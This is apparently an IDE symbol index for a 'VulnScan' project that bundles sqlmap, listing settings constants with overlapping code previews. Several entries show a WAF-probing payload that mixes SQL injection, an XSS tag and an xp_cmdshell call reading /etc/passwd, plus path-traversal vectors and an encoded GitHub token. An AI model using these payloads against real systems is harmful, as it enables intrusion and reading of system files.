        "peekOfCode": "BRUTE_TABLE_EXISTS_TEMPLATE = \"EXISTS(SELECT %d FROM %s)\"\n# Template used for common column existence check\nBRUTE_COLUMN_EXISTS_TEMPLATE = \"EXISTS(SELECT %s FROM %s)\"\n# Data inside shellcodeexec to be filled with random string\nSHELLCODEEXEC_RANDOM_STRING_MARKER = b\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n# Period after last-update to start nagging about the old revision\nLAST_UPDATE_NAGGING_DAYS = 180\n# Minimum non-writing chars (e.g. ['\"-:/]) ratio in case of parsed error messages\nMIN_ERROR_PARSING_NON_WRITING_RATIO = 0.05\n# Generic address for checking the Internet connection while using switch --check-internet (Note: https version does not work for Python < 2.7.9)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BRUTE_COLUMN_EXISTS_TEMPLATE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BRUTE_COLUMN_EXISTS_TEMPLATE = \"EXISTS(SELECT %s FROM %s)\"\n# Data inside shellcodeexec to be filled with random string\nSHELLCODEEXEC_RANDOM_STRING_MARKER = b\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n# Period after last-update to start nagging about the old revision\nLAST_UPDATE_NAGGING_DAYS = 180\n# Minimum non-writing chars (e.g. ['\"-:/]) ratio in case of parsed error messages\nMIN_ERROR_PARSING_NON_WRITING_RATIO = 0.05\n# Generic address for checking the Internet connection while using switch --check-internet (Note: https version does not work for Python < 2.7.9)\nCHECK_INTERNET_ADDRESS = \"http://ipinfo.io/json\"\n# Value to look for in response to CHECK_INTERNET_ADDRESS",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SHELLCODEEXEC_RANDOM_STRING_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SHELLCODEEXEC_RANDOM_STRING_MARKER = b\"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\"\n# Period after last-update to start nagging about the old revision\nLAST_UPDATE_NAGGING_DAYS = 180\n# Minimum non-writing chars (e.g. ['\"-:/]) ratio in case of parsed error messages\nMIN_ERROR_PARSING_NON_WRITING_RATIO = 0.05\n# Generic address for checking the Internet connection while using switch --check-internet (Note: https version does not work for Python < 2.7.9)\nCHECK_INTERNET_ADDRESS = \"http://ipinfo.io/json\"\n# Value to look for in response to CHECK_INTERNET_ADDRESS\nCHECK_INTERNET_VALUE = '\"ip\":'\n# Payload used for checking of existence of WAF/IPS (dummier the better)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LAST_UPDATE_NAGGING_DAYS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LAST_UPDATE_NAGGING_DAYS = 180\n# Minimum non-writing chars (e.g. ['\"-:/]) ratio in case of parsed error messages\nMIN_ERROR_PARSING_NON_WRITING_RATIO = 0.05\n# Generic address for checking the Internet connection while using switch --check-internet (Note: https version does not work for Python < 2.7.9)\nCHECK_INTERNET_ADDRESS = \"http://ipinfo.io/json\"\n# Value to look for in response to CHECK_INTERNET_ADDRESS\nCHECK_INTERNET_VALUE = '\"ip\":'\n# Payload used for checking of existence of WAF/IPS (dummier the better)\nIPS_WAF_CHECK_PAYLOAD = \"AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"\n# Vectors used for provoking specific WAF/IPS behavior(s)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_ERROR_PARSING_NON_WRITING_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_ERROR_PARSING_NON_WRITING_RATIO = 0.05\n# Generic address for checking the Internet connection while using switch --check-internet (Note: https version does not work for Python < 2.7.9)\nCHECK_INTERNET_ADDRESS = \"http://ipinfo.io/json\"\n# Value to look for in response to CHECK_INTERNET_ADDRESS\nCHECK_INTERNET_VALUE = '\"ip\":'\n# Payload used for checking of existence of WAF/IPS (dummier the better)\nIPS_WAF_CHECK_PAYLOAD = \"AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"\n# Vectors used for provoking specific WAF/IPS behavior(s)\nWAF_ATTACK_VECTORS = (\n    \"\",  # NIL",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_INTERNET_ADDRESS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CHECK_INTERNET_ADDRESS = \"http://ipinfo.io/json\"\n# Value to look for in response to CHECK_INTERNET_ADDRESS\nCHECK_INTERNET_VALUE = '\"ip\":'\n# Payload used for checking of existence of WAF/IPS (dummier the better)\nIPS_WAF_CHECK_PAYLOAD = \"AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"\n# Vectors used for provoking specific WAF/IPS behavior(s)\nWAF_ATTACK_VECTORS = (\n    \"\",  # NIL\n    \"search=<script>alert(1)</script>\",\n    \"file=../../../../etc/passwd\",",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_INTERNET_VALUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CHECK_INTERNET_VALUE = '\"ip\":'\n# Payload used for checking of existence of WAF/IPS (dummier the better)\nIPS_WAF_CHECK_PAYLOAD = \"AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"\n# Vectors used for provoking specific WAF/IPS behavior(s)\nWAF_ATTACK_VECTORS = (\n    \"\",  # NIL\n    \"search=<script>alert(1)</script>\",\n    \"file=../../../../etc/passwd\",\n    \"q=<invalid>foobar\",\n    \"id=1 %s\" % IPS_WAF_CHECK_PAYLOAD",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IPS_WAF_CHECK_PAYLOAD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IPS_WAF_CHECK_PAYLOAD = \"AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\\\"XSS\\\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#\"\n# Vectors used for provoking specific WAF/IPS behavior(s)\nWAF_ATTACK_VECTORS = (\n    \"\",  # NIL\n    \"search=<script>alert(1)</script>\",\n    \"file=../../../../etc/passwd\",\n    \"q=<invalid>foobar\",\n    \"id=1 %s\" % IPS_WAF_CHECK_PAYLOAD\n)\n# Used for status representation in dictionary attack phase",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "WAF_ATTACK_VECTORS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "WAF_ATTACK_VECTORS = (\n    \"\",  # NIL\n    \"search=<script>alert(1)</script>\",\n    \"file=../../../../etc/passwd\",\n    \"q=<invalid>foobar\",\n    \"id=1 %s\" % IPS_WAF_CHECK_PAYLOAD\n)\n# Used for status representation in dictionary attack phase\nROTATING_CHARS = ('\\\\', '|', '|', '/', '-')\n# Approximate chunk length (in bytes) used by BigArray objects (only last chunk and cached one are held in memory)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ROTATING_CHARS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ROTATING_CHARS = ('\\\\', '|', '|', '/', '-')\n# Approximate chunk length (in bytes) used by BigArray objects (only last chunk and cached one are held in memory)\nBIGARRAY_CHUNK_SIZE = 1024 * 1024\n# Compress level used for storing BigArray chunks to disk (0-9)\nBIGARRAY_COMPRESS_LEVEL = 9\n# Maximum number of socket pre-connects\nSOCKET_PRE_CONNECT_QUEUE_SIZE = 3\n# Only console display last n table rows\nTRIM_STDOUT_DUMP_SIZE = 256\n# Reference: http://stackoverflow.com/a/3168436",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BIGARRAY_CHUNK_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BIGARRAY_CHUNK_SIZE = 1024 * 1024\n# Compress level used for storing BigArray chunks to disk (0-9)\nBIGARRAY_COMPRESS_LEVEL = 9\n# Maximum number of socket pre-connects\nSOCKET_PRE_CONNECT_QUEUE_SIZE = 3\n# Only console display last n table rows\nTRIM_STDOUT_DUMP_SIZE = 256\n# Reference: http://stackoverflow.com/a/3168436\n# Reference: https://web.archive.org/web/20150407141500/https://support.microsoft.com/en-us/kb/899149\nDUMP_FILE_BUFFER_SIZE = 1024",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BIGARRAY_COMPRESS_LEVEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BIGARRAY_COMPRESS_LEVEL = 9\n# Maximum number of socket pre-connects\nSOCKET_PRE_CONNECT_QUEUE_SIZE = 3\n# Only console display last n table rows\nTRIM_STDOUT_DUMP_SIZE = 256\n# Reference: http://stackoverflow.com/a/3168436\n# Reference: https://web.archive.org/web/20150407141500/https://support.microsoft.com/en-us/kb/899149\nDUMP_FILE_BUFFER_SIZE = 1024\n# Parse response headers only first couple of times\nPARSE_HEADERS_LIMIT = 3",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SOCKET_PRE_CONNECT_QUEUE_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SOCKET_PRE_CONNECT_QUEUE_SIZE = 3\n# Only console display last n table rows\nTRIM_STDOUT_DUMP_SIZE = 256\n# Reference: http://stackoverflow.com/a/3168436\n# Reference: https://web.archive.org/web/20150407141500/https://support.microsoft.com/en-us/kb/899149\nDUMP_FILE_BUFFER_SIZE = 1024\n# Parse response headers only first couple of times\nPARSE_HEADERS_LIMIT = 3\n# Step used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_STEP = 10",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TRIM_STDOUT_DUMP_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TRIM_STDOUT_DUMP_SIZE = 256\n# Reference: http://stackoverflow.com/a/3168436\n# Reference: https://web.archive.org/web/20150407141500/https://support.microsoft.com/en-us/kb/899149\nDUMP_FILE_BUFFER_SIZE = 1024\n# Parse response headers only first couple of times\nPARSE_HEADERS_LIMIT = 3\n# Step used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_STEP = 10\n# Maximum value used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_MAX = 1000",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMP_FILE_BUFFER_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMP_FILE_BUFFER_SIZE = 1024\n# Parse response headers only first couple of times\nPARSE_HEADERS_LIMIT = 3\n# Step used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_STEP = 10\n# Maximum value used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_MAX = 1000\n# Maximum number of times for revalidation of a character in inference (as required)\nMAX_REVALIDATION_STEPS = 5\n# Characters that can be used to split parameter values in provided command line (e.g. in --tamper)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARSE_HEADERS_LIMIT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARSE_HEADERS_LIMIT = 3\n# Step used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_STEP = 10\n# Maximum value used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_MAX = 1000\n# Maximum number of times for revalidation of a character in inference (as required)\nMAX_REVALIDATION_STEPS = 5\n# Characters that can be used to split parameter values in provided command line (e.g. in --tamper)\nPARAMETER_SPLITTING_REGEX = r\"[,|;]\"\n# Regular expression describing possible union char value (e.g. used in --union-char)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORDER_BY_STEP",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ORDER_BY_STEP = 10\n# Maximum value used in ORDER BY technique used for finding the right number of columns in UNION query injections\nORDER_BY_MAX = 1000\n# Maximum number of times for revalidation of a character in inference (as required)\nMAX_REVALIDATION_STEPS = 5\n# Characters that can be used to split parameter values in provided command line (e.g. in --tamper)\nPARAMETER_SPLITTING_REGEX = r\"[,|;]\"\n# Regular expression describing possible union char value (e.g. used in --union-char)\nUNION_CHAR_REGEX = r\"\\A\\w+\\Z\"\n# Attribute used for storing original parameter value in special cases (e.g. POST)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ORDER_BY_MAX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ORDER_BY_MAX = 1000\n# Maximum number of times for revalidation of a character in inference (as required)\nMAX_REVALIDATION_STEPS = 5\n# Characters that can be used to split parameter values in provided command line (e.g. in --tamper)\nPARAMETER_SPLITTING_REGEX = r\"[,|;]\"\n# Regular expression describing possible union char value (e.g. used in --union-char)\nUNION_CHAR_REGEX = r\"\\A\\w+\\Z\"\n# Attribute used for storing original parameter value in special cases (e.g. POST)\nUNENCODED_ORIGINAL_VALUE = \"original\"\n# Common column names containing usernames (used for hash cracking in some cases)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_REVALIDATION_STEPS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_REVALIDATION_STEPS = 5\n# Characters that can be used to split parameter values in provided command line (e.g. in --tamper)\nPARAMETER_SPLITTING_REGEX = r\"[,|;]\"\n# Regular expression describing possible union char value (e.g. used in --union-char)\nUNION_CHAR_REGEX = r\"\\A\\w+\\Z\"\n# Attribute used for storing original parameter value in special cases (e.g. POST)\nUNENCODED_ORIGINAL_VALUE = \"original\"\n# Common column names containing usernames (used for hash cracking in some cases)\nCOMMON_USER_COLUMNS = (\"login\", \"user\", \"username\", \"user_name\", \"user_login\", \"benutzername\", \"benutzer\", \"utilisateur\", \"usager\", \"consommateur\", \"utente\", \"utilizzatore\", \"utilizator\", \"utilizador\", \"usufrutuario\", \"korisnik\", \"uporabnik\", \"usuario\", \"consumidor\", \"client\", \"cuser\")\n# Default delimiter in GET/POST values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PARAMETER_SPLITTING_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PARAMETER_SPLITTING_REGEX = r\"[,|;]\"\n# Regular expression describing possible union char value (e.g. used in --union-char)\nUNION_CHAR_REGEX = r\"\\A\\w+\\Z\"\n# Attribute used for storing original parameter value in special cases (e.g. POST)\nUNENCODED_ORIGINAL_VALUE = \"original\"\n# Common column names containing usernames (used for hash cracking in some cases)\nCOMMON_USER_COLUMNS = (\"login\", \"user\", \"username\", \"user_name\", \"user_login\", \"benutzername\", \"benutzer\", \"utilisateur\", \"usager\", \"consommateur\", \"utente\", \"utilizzatore\", \"utilizator\", \"utilizador\", \"usufrutuario\", \"korisnik\", \"uporabnik\", \"usuario\", \"consumidor\", \"client\", \"cuser\")\n# Default delimiter in GET/POST values\nDEFAULT_GET_POST_DELIMITER = '&'\n# Default delimiter in cookie values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNION_CHAR_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNION_CHAR_REGEX = r\"\\A\\w+\\Z\"\n# Attribute used for storing original parameter value in special cases (e.g. POST)\nUNENCODED_ORIGINAL_VALUE = \"original\"\n# Common column names containing usernames (used for hash cracking in some cases)\nCOMMON_USER_COLUMNS = (\"login\", \"user\", \"username\", \"user_name\", \"user_login\", \"benutzername\", \"benutzer\", \"utilisateur\", \"usager\", \"consommateur\", \"utente\", \"utilizzatore\", \"utilizator\", \"utilizador\", \"usufrutuario\", \"korisnik\", \"uporabnik\", \"usuario\", \"consumidor\", \"client\", \"cuser\")\n# Default delimiter in GET/POST values\nDEFAULT_GET_POST_DELIMITER = '&'\n# Default delimiter in cookie values\nDEFAULT_COOKIE_DELIMITER = ';'\n# Unix timestamp used for forcing cookie expiration when provided with --load-cookies",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNENCODED_ORIGINAL_VALUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNENCODED_ORIGINAL_VALUE = \"original\"\n# Common column names containing usernames (used for hash cracking in some cases)\nCOMMON_USER_COLUMNS = (\"login\", \"user\", \"username\", \"user_name\", \"user_login\", \"benutzername\", \"benutzer\", \"utilisateur\", \"usager\", \"consommateur\", \"utente\", \"utilizzatore\", \"utilizator\", \"utilizador\", \"usufrutuario\", \"korisnik\", \"uporabnik\", \"usuario\", \"consumidor\", \"client\", \"cuser\")\n# Default delimiter in GET/POST values\nDEFAULT_GET_POST_DELIMITER = '&'\n# Default delimiter in cookie values\nDEFAULT_COOKIE_DELIMITER = ';'\n# Unix timestamp used for forcing cookie expiration when provided with --load-cookies\nFORCE_COOKIE_EXPIRATION_TIME = \"9999999999\"\n# Github OAuth token used for creating an automatic Issue for unhandled exceptions",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "COMMON_USER_COLUMNS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "COMMON_USER_COLUMNS = (\"login\", \"user\", \"username\", \"user_name\", \"user_login\", \"benutzername\", \"benutzer\", \"utilisateur\", \"usager\", \"consommateur\", \"utente\", \"utilizzatore\", \"utilizator\", \"utilizador\", \"usufrutuario\", \"korisnik\", \"uporabnik\", \"usuario\", \"consumidor\", \"client\", \"cuser\")\n# Default delimiter in GET/POST values\nDEFAULT_GET_POST_DELIMITER = '&'\n# Default delimiter in cookie values\nDEFAULT_COOKIE_DELIMITER = ';'\n# Unix timestamp used for forcing cookie expiration when provided with --load-cookies\nFORCE_COOKIE_EXPIRATION_TIME = \"9999999999\"\n# Github OAuth token used for creating an automatic Issue for unhandled exceptions\nGITHUB_REPORT_OAUTH_TOKEN = \"Z2hwX2FOMDdpUWx0NDg0ak85QW4yU1pSQjhtazhBaVVlRzNaMUxmMA\"\n# Skip unforced HashDB flush requests below the threshold number of cached items",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_GET_POST_DELIMITER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_GET_POST_DELIMITER = '&'\n# Default delimiter in cookie values\nDEFAULT_COOKIE_DELIMITER = ';'\n# Unix timestamp used for forcing cookie expiration when provided with --load-cookies\nFORCE_COOKIE_EXPIRATION_TIME = \"9999999999\"\n# Github OAuth token used for creating an automatic Issue for unhandled exceptions\nGITHUB_REPORT_OAUTH_TOKEN = \"Z2hwX2FOMDdpUWx0NDg0ak85QW4yU1pSQjhtazhBaVVlRzNaMUxmMA\"\n# Skip unforced HashDB flush requests below the threshold number of cached items\nHASHDB_FLUSH_THRESHOLD = 32\n# Number of retries for unsuccessful HashDB flush attempts",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_COOKIE_DELIMITER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_COOKIE_DELIMITER = ';'\n# Unix timestamp used for forcing cookie expiration when provided with --load-cookies\nFORCE_COOKIE_EXPIRATION_TIME = \"9999999999\"\n# Github OAuth token used for creating an automatic Issue for unhandled exceptions\nGITHUB_REPORT_OAUTH_TOKEN = \"Z2hwX2FOMDdpUWx0NDg0ak85QW4yU1pSQjhtazhBaVVlRzNaMUxmMA\"\n# Skip unforced HashDB flush requests below the threshold number of cached items\nHASHDB_FLUSH_THRESHOLD = 32\n# Number of retries for unsuccessful HashDB flush attempts\nHASHDB_FLUSH_RETRIES = 3\n# Number of retries for unsuccessful HashDB retrieve attempts",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FORCE_COOKIE_EXPIRATION_TIME",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FORCE_COOKIE_EXPIRATION_TIME = \"9999999999\"\n# Github OAuth token used for creating an automatic Issue for unhandled exceptions\nGITHUB_REPORT_OAUTH_TOKEN = \"Z2hwX2FOMDdpUWx0NDg0ak85QW4yU1pSQjhtazhBaVVlRzNaMUxmMA\"\n# Skip unforced HashDB flush requests below the threshold number of cached items\nHASHDB_FLUSH_THRESHOLD = 32\n# Number of retries for unsuccessful HashDB flush attempts\nHASHDB_FLUSH_RETRIES = 3\n# Number of retries for unsuccessful HashDB retrieve attempts\nHASHDB_RETRIEVE_RETRIES = 3\n# Number of retries for unsuccessful HashDB end transaction attempts",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GITHUB_REPORT_OAUTH_TOKEN",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GITHUB_REPORT_OAUTH_TOKEN = \"Z2hwX2FOMDdpUWx0NDg0ak85QW4yU1pSQjhtazhBaVVlRzNaMUxmMA\"\n# Skip unforced HashDB flush requests below the threshold number of cached items\nHASHDB_FLUSH_THRESHOLD = 32\n# Number of retries for unsuccessful HashDB flush attempts\nHASHDB_FLUSH_RETRIES = 3\n# Number of retries for unsuccessful HashDB retrieve attempts\nHASHDB_RETRIEVE_RETRIES = 3\n# Number of retries for unsuccessful HashDB end transaction attempts\nHASHDB_END_TRANSACTION_RETRIES = 3\n# Unique milestone value used for forced deprecation of old HashDB values (e.g. when changing hash/pickle mechanism)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_FLUSH_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASHDB_FLUSH_THRESHOLD = 32\n# Number of retries for unsuccessful HashDB flush attempts\nHASHDB_FLUSH_RETRIES = 3\n# Number of retries for unsuccessful HashDB retrieve attempts\nHASHDB_RETRIEVE_RETRIES = 3\n# Number of retries for unsuccessful HashDB end transaction attempts\nHASHDB_END_TRANSACTION_RETRIES = 3\n# Unique milestone value used for forced deprecation of old HashDB values (e.g. when changing hash/pickle mechanism)\nHASHDB_MILESTONE_VALUE = \"OdqjeUpBLc\"  # python -c 'import random, string; print \"\".join(random.sample(string.ascii_letters, 10))'\n# Pickle protocl used for storage of serialized data inside HashDB (https://docs.python.org/3/library/pickle.html#data-stream-format)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_FLUSH_RETRIES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASHDB_FLUSH_RETRIES = 3\n# Number of retries for unsuccessful HashDB retrieve attempts\nHASHDB_RETRIEVE_RETRIES = 3\n# Number of retries for unsuccessful HashDB end transaction attempts\nHASHDB_END_TRANSACTION_RETRIES = 3\n# Unique milestone value used for forced deprecation of old HashDB values (e.g. when changing hash/pickle mechanism)\nHASHDB_MILESTONE_VALUE = \"OdqjeUpBLc\"  # python -c 'import random, string; print \"\".join(random.sample(string.ascii_letters, 10))'\n# Pickle protocl used for storage of serialized data inside HashDB (https://docs.python.org/3/library/pickle.html#data-stream-format)\nPICKLE_PROTOCOL = 2\n# Warn user of possible delay due to large page dump in full UNION query injections",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_RETRIEVE_RETRIES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASHDB_RETRIEVE_RETRIES = 3\n# Number of retries for unsuccessful HashDB end transaction attempts\nHASHDB_END_TRANSACTION_RETRIES = 3\n# Unique milestone value used for forced deprecation of old HashDB values (e.g. when changing hash/pickle mechanism)\nHASHDB_MILESTONE_VALUE = \"OdqjeUpBLc\"  # python -c 'import random, string; print \"\".join(random.sample(string.ascii_letters, 10))'\n# Pickle protocl used for storage of serialized data inside HashDB (https://docs.python.org/3/library/pickle.html#data-stream-format)\nPICKLE_PROTOCOL = 2\n# Warn user of possible delay due to large page dump in full UNION query injections\nLARGE_OUTPUT_THRESHOLD = 1024 ** 2\n# On huge tables there is a considerable slowdown if every row retrieval requires ORDER BY (most noticable in table dumping using ERROR injections)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_END_TRANSACTION_RETRIES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASHDB_END_TRANSACTION_RETRIES = 3\n# Unique milestone value used for forced deprecation of old HashDB values (e.g. when changing hash/pickle mechanism)\nHASHDB_MILESTONE_VALUE = \"OdqjeUpBLc\"  # python -c 'import random, string; print \"\".join(random.sample(string.ascii_letters, 10))'\n# Pickle protocl used for storage of serialized data inside HashDB (https://docs.python.org/3/library/pickle.html#data-stream-format)\nPICKLE_PROTOCOL = 2\n# Warn user of possible delay due to large page dump in full UNION query injections\nLARGE_OUTPUT_THRESHOLD = 1024 ** 2\n# On huge tables there is a considerable slowdown if every row retrieval requires ORDER BY (most noticable in table dumping using ERROR injections)\nSLOW_ORDER_COUNT_THRESHOLD = 10000\n# Give up on hash recognition if nothing was found in first given number of rows",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASHDB_MILESTONE_VALUE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
